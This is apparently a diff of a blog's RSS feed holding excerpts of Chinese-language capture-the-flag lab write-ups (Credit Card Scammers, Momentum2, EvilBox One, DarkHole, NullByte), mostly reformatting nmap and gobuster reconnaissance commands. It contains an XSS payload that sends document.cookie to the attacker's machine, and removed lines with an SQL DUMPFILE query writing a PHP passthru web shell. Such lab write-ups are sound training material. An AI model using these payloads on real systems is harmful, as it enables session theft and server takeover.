 &lt;p&gt;binary 进入 二进制 模式&lt;/p&gt;</description></item><item><title>Credit Card Scammers Writeup</title><link>https://enilmalus.github.io/posts/credit-card-scammers-writeup/</link><pubDate>Sun, 18 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/credit-card-scammers-writeup/</guid><description>&lt;blockquote&gt;
 &lt;p&gt;此文章以 kali 地址为 10.10.10.5 为示例&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h1 id="credit-card-scammers-靶场"&gt;Credit Card Scammers 靶场&lt;/h1&gt;
 &lt;h2 id="服务扫描"&gt;服务扫描&lt;/h2&gt;
 &lt;p&gt;扫描所执行的命令，执行结果如下&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -sn 10.10.10.0/24
-
-sudo nmap --min-rate 10000 -p- 10.10.10.31 
-
-sudo nmap -sC -sT -sV -p22,80,443,9090 10.10.10.31 
-
-sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/aaa.png" alt="aaa.png"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -sn 10.10.10.0/24
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --min-rate &lt;span style="color:#ae81ff"&gt;10000&lt;/span&gt; -p- 10.10.10.31 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -sC -sT -sV -p22,80,443,9090 10.10.10.31 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --script&lt;span style="color:#f92672"&gt;=&lt;/span&gt;vuln -p22,80,443,9090 10.10.10.31 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/aaa.png" alt="aaa.png"&gt;&lt;/p&gt;
 &lt;h2 id="gobuster-爆破目录"&gt;gobuster 爆破目录&lt;/h2&gt;
 &lt;p&gt;在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo gobuster dir -u http://10.10.10.33 -w /usr/share/wordlists/dirb/common.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/bbb.png" alt="bbb.png"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo gobuster dir -u http://10.10.10.33 -w /usr/share/wordlists/dirb/common.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/bbb.png" alt="bbb.png"&gt;&lt;/p&gt;
 &lt;h2 id="web-渗透"&gt;Web 渗透&lt;/h2&gt;
 &lt;p&gt;审计爆破的目录发现在 admin 下有一个登入界面&lt;/p&gt;
 &lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/ccc.png" alt="ccc.png"&gt;&lt;/p&gt;
@@ -438,28 +436,25 @@ sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31
 &lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;script&amp;gt;new Image().src=&amp;#34;http://10.10.10.5/?c=&amp;#34;+document.cookie;&amp;lt;/script&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="ee.png" alt="ee.png"&gt;&lt;/p&gt;
 &lt;p&gt;kali 架设连接&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;python3 -m http.server 80
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/fff.png" alt="fff.png"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;python3 -m http.server &lt;span style="color:#ae81ff"&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/fff.png" alt="fff.png"&gt;&lt;/p&gt;
 &lt;p&gt;修改 cookie 登入&lt;/p&gt;
 &lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/ggg.png" alt="ggg.png"&gt;&lt;/p&gt;
-&lt;p&gt;注入 sql 反弹 shell&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;SELECT &amp;#34;&amp;lt;?php passthru($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;#34; INTO DUMPFILE &amp;#39;/var/www/html/shell.php&amp;#39;
-&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;http://10.10.10.33/shell.php?cmd=pwd
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="content/posts/Credit%20Card%20Scammers%20Writeup/hhh.png" alt="hhh.png"&gt;&lt;/p&gt;</description></item><item><title>Momentum2 Writeup</title><link>https://enilmalus.github.io/posts/momentum2-writeup/</link><pubDate>Fri, 16 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/momentum2-writeup/</guid><description>&lt;h1 id="服务扫描"&gt;服务扫描&lt;/h1&gt;
+&lt;p&gt;注入 sql 反弹 shell&lt;/p&gt;</description></item><item><title>Momentum2 Writeup</title><link>https://enilmalus.github.io/posts/momentum2-writeup/</link><pubDate>Fri, 16 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/momentum2-writeup/</guid><description>&lt;h1 id="服务扫描"&gt;服务扫描&lt;/h1&gt;
 &lt;h2 id="使用-nmap-进行基础扫描"&gt;使用 nmap 进行基础扫描&lt;/h2&gt;
 &lt;p&gt;扫描所执行的命令，执行结果如下&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -sn 10.10.10.0/24
-
-sudo nmap --min-rate 10000 -p- 10.10.10.31 
-
-sudo nmap -sC -sT -sV -p22,80 10.10.10.31 
-
-sudo nmap --script=vuln -p22,80 10.10.10.31 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="content/posts/Momentum2%20Writeup/P1.png" alt="P1"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -sn 10.10.10.0/24
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --min-rate &lt;span style="color:#ae81ff"&gt;10000&lt;/span&gt; -p- 10.10.10.31 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -sC -sT -sV -p22,80 10.10.10.31 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --script&lt;span style="color:#f92672"&gt;=&lt;/span&gt;vuln -p22,80 10.10.10.31 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="content/posts/Momentum2%20Writeup/P1.png" alt="P1"&gt;&lt;/p&gt;
 &lt;h2 id="gobuster-爆破目录"&gt;gobuster 爆破目录&lt;/h2&gt;
 &lt;p&gt;在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo gobuster dir -u http://10.10.10.31 -w /usr/share/wordlists/dirb/common.txt -x php,php.bak,jsp.zip,html
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P2.png" alt="P2"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo gobuster dir -u http://10.10.10.31 -w /usr/share/wordlists/dirb/common.txt -x php,php.bak,jsp.zip,html
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="P2.png" alt="P2"&gt;&lt;/p&gt;
 &lt;h1 id="web-渗透"&gt;Web 渗透&lt;/h1&gt;
 &lt;h2 id="页面分析"&gt;页面分析&lt;/h2&gt;
 &lt;p&gt;这是 80端口 的页面&lt;/p&gt;
@@ -467,62 +462,60 @@ sudo nmap --script=vuln -p22,80 10.10.10.31
 &lt;p&gt;dashborard 界面像是一个文件上次的界面，可能存在 &lt;strong&gt;文件上传&lt;/strong&gt; 漏洞&lt;/p&gt;
 &lt;p&gt;&lt;img src="P4.png" alt="P4"&gt;&lt;/p&gt;
 &lt;p&gt;ajax.bak 是备份文件，curl 下载看看&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;curl http://10.10.10.31/ajax.php.bak
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P5.png" alt="P5"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl http://10.10.10.31/ajax.php.bak
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="P5.png" alt="P5"&gt;&lt;/p&gt;
 &lt;p&gt;审计源码，文件上传的时候当 &lt;strong&gt;cookie&lt;/strong&gt; 名为 &lt;strong&gt;admin&lt;/strong&gt; ， 值为**&amp;amp;G6u@B6uDXMq&amp;amp;Ms** 同时 POST 名为 &lt;strong&gt;secure&lt;/strong&gt; ，值为 &lt;strong&gt;val1d&lt;/strong&gt; 的时候可以上传 pdf、php、txt 文件，否则只能上传 txt 文件
 （注释说 cookie 末尾要加一个大写字母）&lt;/p&gt;</description></item><item><title>EvilBox One Writeup</title><link>https://enilmalus.github.io/posts/evilbox-one-writeup/</link><pubDate>Sun, 11 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/evilbox-one-writeup/</guid><description>&lt;blockquote&gt;
 &lt;p&gt;此文章以 kali 地址为 10.10.10.5 为示例&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h1 id="evilbox-one"&gt;EvilBox One&lt;/h1&gt;
 &lt;h2 id="主机发现"&gt;主机发现&lt;/h2&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;
-sudo nmap -sn 10.10.10.0/24
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;靶机的主机为 10.10.10.18&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -sn 10.10.10.0/24
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;靶机的主机为 10.10.10.18&lt;/p&gt;
 &lt;h2 id="服务识别"&gt;服务识别&lt;/h2&gt;
 &lt;p&gt;使用 nmap 对靶机进行扫描，寻找靶机开放的端口以便于进行更进一步的渗透测试&lt;/p&gt;
 &lt;p&gt;扫描开放的端口&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;
-sudo nmap --min-rate 10000 -p- 10.10.10.18
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;扫描开放端口的基本信息，并将结果保存到本地以便于随时观看&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;
-sudo nmap -sT -sC -sV -p22,80 10.10.10.18 -oA nmap/Scan
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="content/posts/EvilBox%20One%20Writeup/P1.png" alt="P1"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --min-rate &lt;span style="color:#ae81ff"&gt;10000&lt;/span&gt; -p- 10.10.10.18
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;扫描开放端口的基本信息，并将结果保存到本地以便于随时观看&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -sT -sC -sV -p22,80 10.10.10.18 -oA nmap/Scan
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="content/posts/EvilBox%20One%20Writeup/P1.png" alt="P1"&gt;&lt;/p&gt;
 &lt;p&gt;使用 nmap 进行默认的漏洞脚本扫描，并将结果保存到本地&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;
-sudo nmap --script=vuln -p22,80 10.10.10.18 -oA nmap/Script
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P2.png" alt="P2"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --script&lt;span style="color:#f92672"&gt;=&lt;/span&gt;vuln -p22,80 10.10.10.18 -oA nmap/Script
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="P2.png" alt="P2"&gt;&lt;/p&gt;
 &lt;p&gt;发现暴露出了很多目录，执行一下完整的目录爆破&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;
-sudo gobuster dir -u http://10.10.10.18 -w /usr/share/dirb/wordlists/common.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P3.png" alt="P3"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo gobuster dir -u http://10.10.10.18 -w /usr/share/dirb/wordlists/common.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="P3.png" alt="P3"&gt;&lt;/p&gt;
 &lt;h2 id="web-渗透"&gt;WEB 渗透&lt;/h2&gt;
 &lt;p&gt;80 界面是默认的 Apache2 界面&lt;/p&gt;
 &lt;p&gt;&lt;img src="P4.png" alt="P4"&gt;&lt;/p&gt;
 &lt;p&gt;robots.txt 界面是一句话，没有价值&lt;/p&gt;
-&lt;p&gt;&lt;img src="P5.png" alt="P5"&gt;&lt;/p&gt;
-&lt;p&gt;secret 界面打不开，&lt;/p&gt;
-&lt;p&gt;gobuster 告诉我们 secret 下面可能还有目录，&lt;/p&gt;</description></item><item><title>DarkHole Writeup</title><link>https://enilmalus.github.io/posts/darkhole-writeup/</link><pubDate>Sat, 10 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/darkhole-writeup/</guid><description>&lt;blockquote&gt;
+&lt;p&gt;&lt;img src="P5.png" alt="P5"&gt;&lt;/p&gt;</description></item><item><title>DarkHole Writeup</title><link>https://enilmalus.github.io/posts/darkhole-writeup/</link><pubDate>Sat, 10 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/darkhole-writeup/</guid><description>&lt;blockquote&gt;
 &lt;p&gt;此文章以 kali 地址为 10.10.10.5 为示例&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h1 id="darkhole-靶场"&gt;DarkHole 靶场&lt;/h1&gt;
 &lt;h2 id="主机发现"&gt;主机发现&lt;/h2&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -sn 10.10.10.0/24
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="aaa.png" alt="aaa"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -sn 10.10.10.0/24
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="aaa.png" alt="aaa"&gt;&lt;/p&gt;
 &lt;p&gt;靶机的主机为 10.10.10.9&lt;/p&gt;
 &lt;h2 id="服务识别"&gt;服务识别&lt;/h2&gt;
 &lt;p&gt;使用 nmap 对靶机进行扫描，寻找靶机开放的端口以便于进行更进一步的渗透测试&lt;/p&gt;
 &lt;p&gt;扫描开放的端口&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap --min-rate 10000 -p- 10.10.10.9
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="bbb.png" alt="bbb"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --min-rate &lt;span style="color:#ae81ff"&gt;10000&lt;/span&gt; -p- 10.10.10.9
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="bbb.png" alt="bbb"&gt;&lt;/p&gt;
 &lt;p&gt;扫描开放端口的基本信息，并将结果保存到本地以便于随时观看&lt;/p&gt;
 &lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -sT -sC -sV -p22,80 10.10.10.9 -oA nmap/Scan
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="ccc.png" alt="ccc"&gt;&lt;/p&gt;
 &lt;p&gt;使用 nmap 进行默认的漏洞脚本扫描，并将结果保存到本地&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap --script=vuln -p22,80 10.10.10.9 -oA nmap/Script
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="ddd.png" alt="ddd"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --script&lt;span style="color:#f92672"&gt;=&lt;/span&gt;vuln -p22,80 10.10.10.9 -oA nmap/Script
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="ddd.png" alt="ddd"&gt;&lt;/p&gt;
 &lt;p&gt;发现暴露出了很多目录，执行一下完整的目录爆破&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo gobuster dir -u /usr/share/dirb/wordlists/common.txt 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="eeee.png" alt="eeee"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo gobuster dir -u /usr/share/dirb/wordlists/common.txt 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="eeee.png" alt="eeee"&gt;&lt;/p&gt;
 &lt;p&gt;除了 index.php 其他都是文件目录，
 upload 可能是文件上传的目录&lt;/p&gt;
 &lt;p&gt;&lt;img src="fff.png" alt="fff"&gt;&lt;/p&gt;
@@ -533,20 +526,20 @@ upload 可能是文件上传的目录&lt;/p&gt;
 &lt;p&gt;View Details 点击没反应，
 进入 Login 页面&lt;/p&gt;</description></item><item><title>NullByte Writeup</title><link>https://enilmalus.github.io/posts/nullbyte-writeup/</link><pubDate>Thu, 08 May 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/nullbyte-writeup/</guid><description>&lt;h1 id="nullbyte-靶场"&gt;NullByte 靶场&lt;/h1&gt;
 &lt;h2 id="主机发现"&gt;主机发现&lt;/h2&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -sn 10.10.10.10
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="content/posts/NullByte%20Writeup/P1.png" alt="P1"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -sn 10.10.10.10
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="content/posts/NullByte%20Writeup/P1.png" alt="P1"&gt;&lt;/p&gt;
 &lt;p&gt;靶机的主机为 10.10.10.7&lt;/p&gt;
 &lt;h2 id="服务识别"&gt;服务识别&lt;/h2&gt;
 &lt;p&gt;使用 nmap 对靶机进行扫描，寻找靶机开放的端口以便于进行更进一步的渗透测试&lt;/p&gt;
 &lt;p&gt;扫描开放的端口&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap --min-rate 10000 -p- 10.10.10.7
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P2.png" alt="P2"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --min-rate &lt;span style="color:#ae81ff"&gt;10000&lt;/span&gt; -p- 10.10.10.7
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="P2.png" alt="P2"&gt;&lt;/p&gt;
 &lt;p&gt;扫描开放端口的基本信息，并将结果保存到本地以便于随时观看&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap -sT -sC -sV -p80,111,777,48675 10.10.10.7 -oA nmap/Scan
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P4.png" alt="P4"&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap -sT -sC -sV -p80,111,777,48675 10.10.10.7 -oA nmap/Scan
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="P4.png" alt="P4"&gt;&lt;/p&gt;
 &lt;p&gt;使用 nmap 进行默认的漏洞脚本扫描，并将结果保存到本地&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo nmap --script=vuln -p80,111,777,48675 10.10.10.7 -oA nmap/Script
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;经过分析发现靶机运行的是 Apache 服务；
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo nmap --script&lt;span style="color:#f92672"&gt;=&lt;/span&gt;vuln -p80,111,777,48675 10.10.10.7 -oA nmap/Script
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;经过分析发现靶机运行的是 Apache 服务；
 777 端口运行的是 SSH 服务，&lt;/p&gt;
 &lt;p&gt;暂时没有新的发现，先访问 80 端口&lt;/p&gt;
 &lt;h2 id="web渗透"&gt;WEB渗透&lt;/h2&gt;
@@ -554,8 +547,8 @@ upload 可能是文件上传的目录&lt;/p&gt;
 &lt;p&gt;打开 80 页面发现只有一张图片和一句话&lt;/p&gt;
 &lt;p&gt;&lt;img src="P3.png" alt="P3"&gt;&lt;/p&gt;
 &lt;p&gt;查看源码发现这是一个 gif 文件，把他下载下来&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;wget http://10.10.10.7/main.git
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="目录爆破"&gt;目录爆破&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;wget http://10.10.10.7/main.git
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="目录爆破"&gt;目录爆破&lt;/h3&gt;
 &lt;p&gt;使用 gobuster 执行目录爆破，尝试发现新的目录&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;sudo gobuster dir -u http://10.10.10.7 -w /usr/share/dirb/wordlists/common.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="P5.png" alt="P5"&gt;&lt;/p&gt;</description></item></channel></rss>
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo gobuster dir -u http://10.10.10.7 -w /usr/share/dirb/wordlists/common.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="P5.png" alt="P5"&gt;&lt;/p&gt;</description></item></channel></rss>
